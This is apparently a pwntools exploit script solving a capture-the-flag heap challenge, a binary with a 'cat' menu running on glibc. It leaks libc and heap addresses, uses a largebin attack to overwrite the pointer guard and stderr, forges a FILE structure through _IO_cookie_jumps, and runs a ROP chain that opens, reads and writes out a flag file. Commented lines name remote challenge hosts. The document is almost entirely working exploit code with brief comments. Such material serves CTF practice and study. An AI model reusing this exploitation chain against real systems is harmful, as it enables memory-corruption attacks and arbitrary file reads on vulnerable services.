from pwn import *
context.log_level="debug"
context.arch="amd64"
sh=process("./pwn")
# nc 182.92.223.176 30241
# nc 47.93.187.169 44139
# sh=remote("47.93.187.169",44139)
def firstinit():
    payload=b"LOGIN |content r00tQWBaaaaaadminQWXF"
    sh.sendlineafter(b'mew mew mew~~~~~~\n',payload)
def cmd(c):
    payload=b"CAT |content r00tQWBaaaaa$"+p32(0x0FFFFFFFF)+b"QWXF"
    sh.sendlineafter(b'mew mew mew~~~~~~\n',payload)
    sh.sendlineafter(b'plz input your cat choice:\n', str(c).encode())
def add(idx,size,ctt):
    cmd(1)
    sh.sendlineafter(b"plz input your cat idx:\n",str(idx).encode())
    sh.sendlineafter(b"plz input your cat size:\n",str(size).encode()) #0x417<size<0x46f
    sh.sendlineafter(b"plz input your content:\n",ctt)
def dele(idx):
    cmd(2)
    sh.sendlineafter(b"plz input your cat idx:\n", str(idx).encode())
def show(idx):
    cmd(3)
    sh.sendlineafter(b"plz input your cat idx:\n", str(idx).encode())
def edit(idx,ctt):
    cmd(4)
    sh.sendlineafter(b"plz input your cat idx:\n", str(idx).encode())
    sh.sendlineafter(b"plz input your content:\n", ctt)
def rol(data): #循环左移11位
    print(data)
    dl=bin(data)[2:]
    dl=dl.rjust(64,"0")
    print(dl)
    res=''
    for i in range(64):
        res+=dl[(i+0x11)%64]
    print(res)
    res=int(res,2)
    return res
firstinit()
#可以申请大chunk

#首先申请一个较大的chunk1 放入largebin
#申请一个小一点的chunk2
#修改chunk1的bk_nextsize为任意地址target
#将chunk2放入largebin
#target+0x20 -> &chunk2

#free-> unsortedbin 0x428
#malloc() 0x438
add(0,0x428,b'a')
add(1,0x420,b'b')
add(2,0x418,b'c')
add(3,0x420,b'd')
dele(0)
dele(2)
show(0)
leak_libc=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success("leak_libc:"+hex(leak_libc))
sh.recv(2)
leak_heap=u64(sh.recv(8))
success("leak_heap:"+hex(leak_heap))
libcbase=leak_libc-0x219ce0
heapbase=(leak_heap>>12)<<12
success("libcbase:"+hex(libcbase))
success("heapbase:"+hex(heapbase))
libc=ELF("./libc.so.6")
libc.address=libcbase
system=libc.sym['system']
binsh=libc.search(b'/bin/sh').__next__()
io_wstrn_jumps=libcbase+0x215dc0
io_cookie_jump=libcbase+0x215b80
_IO_stdfile_2_lock=libcbase+0x21ba60
largebin_fd=libcbase+0x21a0e0-16
largebin_fdnsize=heapbase+0x290
gadget1=libcbase+0x00000000001675b0 #mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
gadget2=libcbase+0x000000000005a170 #mov rsp, rdx ; ret
rax=libcbase+0x0000000000045eb0
rdi=libcbase+0x000000000002a3e5
rsi=libcbase+0x000000000002be51
rdxr12=libcbase+0x000000000011f497
read=libc.sym['read']
write=libc.sym['write']
close=libc.sym['close']
syscall=libc.sym['syscall']
setcontext=0x529ad+libcbase
add(4,0x428,b'e')
ptr_guard=libcbase-0x28c0+0x30
key=heapbase+0xaf0
stdout=libcbase+0x21a868
stderr=libcbase+0x21a860
stdin=libcbase+0x21a870
leak_heap=heapbase+0x1bd0-0x10
success("fs:"+hex(ptr_guard-0x30))
add(5,0x418,b'f')
dele(4)
payload=b'\x00'*(0x78)+p64(_IO_stdfile_2_lock)+b'\x00'*0x48+p64(io_cookie_jump+0x40)+p64(leak_heap+0x10)+p64(0)+p64(rol(gadget1^key))+p64(0)+p64(0)
add(6,0x438,payload)
dele(5)
edit(4,p64(largebin_fd)*2+p64(largebin_fdnsize)+p64(ptr_guard-0x20))
add(7,0x438,b'h')   
# add(8,0x448,b'j')
# add(9,0x448,b'k')
# dele(8)
# add(10,0x458,b'l')
# dele(6)
# edit(8,p64(largebin_fd+16)*2+p64(largebin_fdnsize+0x1930)+p64(stderr-0x20))
# add(11,0x458,b'l')
add(8,0x46f,b'?')
add(9,0x46f,b'?')
dele(9)
dele(8)

flagoffset=0xe8+0x10+0x18
payload=b'' #gadget&fakesp&shellcode
payload+=p64(rdi)+p64(leak_heap+0x10)+p64(rdxr12)+p64(gadget2)*2 #gadget
payload+=p64(rdi)+p64(0)+p64(close) #40
payload+=p64(rdi)+p64(0x2)+p64(rsi)+p64(flagoffset+leak_heap)+p64(rdxr12)+p64(0)*2+p64(syscall)  #68+0x18 #open
payload+=p64(rdi)+p64(0)+p64(rsi)+p64(heapbase)+p64(rdxr12)+p64(0x40)*2+p64(read) #a8+0x18 #read
payload+=p64(rdi)+p64(1)+p64(rsi)+p64(heapbase)+p64(rdxr12)+p64(0x40)*2+p64(write) #e8+0x18 #write #orw
payload+=b'flag\x00'
add(10,0x440,payload)
add(11,0x448,p64(0)*4+p64(0)+p64(0xcd1))
add(12,0x448,b'k')
dele(11)
# gdb.attach(sh)
add(13,0x458,b'l')
dele(6)
dele(9)
# gdb.attach(sh,'b sysmalloc\nc')
edit(11,p64(largebin_fd+16)*2+p64(largebin_fdnsize+0x1930)+p64(stderr-0x20)+p64(0)+p64(0x111))
# gdb.attach(sh,'b _IO_cookie_write\nc')
cmd(1)
sh.sendlineafter(b"plz input your cat idx:\n",str(14).encode())
sh.sendlineafter(b"plz input your cat size:\n",str(0x458).encode()) #0x417<size<0x46f
sh.interactive()